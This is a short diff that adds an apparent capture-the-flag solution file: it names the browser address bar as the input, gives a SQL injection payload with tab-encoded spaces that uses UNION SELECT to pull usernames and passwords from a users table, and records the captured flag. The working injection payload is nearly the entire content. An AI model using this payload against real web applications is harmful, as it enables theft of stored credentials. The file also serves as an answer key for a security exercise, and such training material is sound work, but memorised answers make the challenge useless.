@@ -1,0 +1,3 @@
+Input field : browser address bar
+payload : "q='%09and%090%09union%09select%09username,%09password,%09NULL%09FROM%09users%09--%09"
+flag : FLAG-26184a4137f2d771dba7cf239fc064e5
